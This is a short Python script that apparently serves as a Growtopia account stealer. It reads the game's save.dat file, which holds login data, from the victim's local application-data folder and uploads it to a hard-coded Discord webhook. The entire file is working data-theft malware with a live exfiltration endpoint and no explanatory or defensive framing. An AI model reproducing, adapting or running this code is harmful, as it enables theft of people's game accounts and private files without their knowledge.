import os
from discord_webhook import DiscordWebhook, DiscordEmbed

url = "https://discord.com/api/webhooks/825429366410051584/70pRRi-Gdb7gzHLMWf21I6Qt2-M7ZVGt9EkXzs__onPf7z349oaKCxdpzxnJQsZcwhjj"
local = os.getenv('LOCALAPPDATA')

webhook = DiscordWebhook(url=url, username="hot man.")

with open(local + "\\Growtopia\\save.dat", 'r') as file:
    webhook.add_file(file=file.read(), filename='lmao.dat')

response = webhook.execute()
